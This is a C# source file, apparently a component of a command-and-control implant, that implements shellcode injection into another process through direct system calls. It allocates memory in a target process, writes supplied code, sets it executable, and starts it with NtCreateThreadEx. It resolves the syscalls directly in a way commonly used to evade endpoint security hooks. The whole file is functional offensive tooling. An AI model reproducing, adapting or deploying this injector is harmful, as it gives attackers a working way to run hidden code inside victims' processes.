using System;
using System.Runtime.InteropServices;
using ApolloInterop.Classes.Core;
using ApolloInterop.Interfaces;
using Injection.Shared;

namespace Injection.Techniques.Syscall_x64
{
    public class NtCreateThreadEx : InjectionTechnique
    {
        private USysCall64 _syscall;
        private delegate uint NtAllocateVirtualMemory(
            IntPtr hProcess,
            ref IntPtr lpBaseAddress,
            IntPtr ZeroBits,
            ref UIntPtr RegionSize,
            Win32.AllocationType AllocationType,
            Win32.MemoryProtection Protect);
        
        private delegate uint NtProtectVirtualMemory(
            IntPtr hProcess,
            ref IntPtr lpBaseAddress,
            ref uint dwLength,
            Win32.MemoryProtection dwDesiredAccess,
            out Win32.MemoryProtection dwOldProtect);

        private delegate uint NtWriteVirtualMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            uint dwLength,
            out uint dwBytesWritten);
        
        private delegate uint NtCreateThreadExDelegate(
            out IntPtr hThread,
            Win32.ACCESS_MASK dwDesiredAccess,
            IntPtr lpThreadAttributes,
            IntPtr hProcess,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            bool bCreateSuspended,
            uint StackZeroBits,
            uint SizeOfStackCommit,
            uint SizeOfStackReserve,
            IntPtr lpBuffer);
        
        private NtAllocateVirtualMemory _pNtAllocateVirtualMemory;
        private NtProtectVirtualMemory _pNtProtectVirtualMemory;
        private NtWriteVirtualMemory _pNtWriteVirtualMemory;
        private NtCreateThreadExDelegate _pNtCreateThreadEx;

        public NtCreateThreadEx(IAgent agent, byte[] code, int pid) : base(agent, code, pid)
        {
            Setup(agent);
        }

        public NtCreateThreadEx(IAgent agent, byte[] code, IntPtr hProcess) : base(agent, code, hProcess)
        {
            Setup(agent);
        }

        private void Setup(IAgent agent)
        {
            if (IntPtr.Size != 8)
            {
                throw new Exception("Must be running in a 64-bit process.");
            }
            _syscall = new USysCall64(agent);
            try
            {
                _pNtAllocateVirtualMemory = _syscall.MarshalNtSyscall<NtAllocateVirtualMemory>("NtAllocateVirtualMemory");
            }
            catch (Exception ex)
            {
                throw new Exception("Failed to get function pointer for NtAllocateVirtualMemory", ex);
            }

            try
            {
                _pNtProtectVirtualMemory = _syscall.MarshalNtSyscall<NtProtectVirtualMemory>("NtProtectVirtualMemory");
            }
            catch (Exception ex)
            {
                throw new Exception("Failed to get function pointer for NtProtectVirtualMemory", ex);
            }

            try
            {
                _pNtCreateThreadEx = _syscall.MarshalNtSyscall<NtCreateThreadExDelegate>("NtCreateThreadEx");
            }
            catch (Exception ex)
            {
                throw new Exception("Failed to get function pointer for NtCreateThreadEx", ex);
            }

            try
            {
                _pNtWriteVirtualMemory = _syscall.MarshalNtSyscall<NtWriteVirtualMemory>("NtWriteVirtualMemory");
            }
            catch (Exception ex)
            {
                throw new Exception("Failed to resolve function pointer for NtWriteVirtualMemory", ex);
            }
        }

        public override bool Inject(string arguments = "")
        {
            IntPtr pMemoryAllocation = new IntPtr();
            UIntPtr pAllocationSize = new UIntPtr(Convert.ToUInt64(_code.Length));
            Win32.AllocationType allocationType = Win32.AllocationType.Commit | Win32.AllocationType.Reserve;
            Win32.MemoryProtection protection = Win32.MemoryProtection.ReadWrite;
            uint codeLen = (uint) _code.Length;
            try
            {
                uint ntStatus = _pNtAllocateVirtualMemory(
                    _hProcess,
                    ref pMemoryAllocation,
                    IntPtr.Zero,
                    ref pAllocationSize,
                    allocationType,
                    protection);
                if (ntStatus != 0)
                {
                    throw new Exception("Failed to allocate memory for code");
                }
                
                
                ntStatus = _pNtWriteVirtualMemory(
                    _hProcess,
                    pMemoryAllocation, 
                    _code,
                    codeLen,
                    out uint bytesWritten);
                
                ntStatus = _pNtProtectVirtualMemory(
                    _hProcess,
                    ref pMemoryAllocation,
                    ref codeLen,
                    Win32.MemoryProtection.ExecuteRead,
                    out Win32.MemoryProtection _);
                if (ntStatus != 0)
                {
                    throw new Exception("Failed to set memory protection");
                }
                
                IntPtr hThread = new IntPtr(0);
                Win32.ACCESS_MASK dwDesiredAccess =
                    Win32.ACCESS_MASK.SPECIFIC_RIGHTS_ALL | Win32.ACCESS_MASK.STANDARD_RIGHTS_ALL;
                IntPtr pObjectAttributes = new IntPtr(0);
                IntPtr lpParameter = new IntPtr(0);
                bool bCreateSuspended = false;
                uint stackZeroBits = 0;
                uint sizeOfStackCommit = 0xFFFF;
                uint sizeOfStackReserve = 0xFFFF;
                IntPtr pBytesBuffer = new IntPtr(0);

                ntStatus = _pNtCreateThreadEx(
                    out hThread,
                    dwDesiredAccess,
                    pObjectAttributes,
                    _hProcess,
                    pMemoryAllocation,
                    lpParameter,
                    bCreateSuspended,
                    stackZeroBits,
                    sizeOfStackCommit,
                    sizeOfStackReserve,
                    pBytesBuffer);
                if (ntStatus != 0)
                {
                    throw new Exception("Failed to create thread");
                }
            }
            catch
            {
                return false;
            }

            return true;
        }
    }
}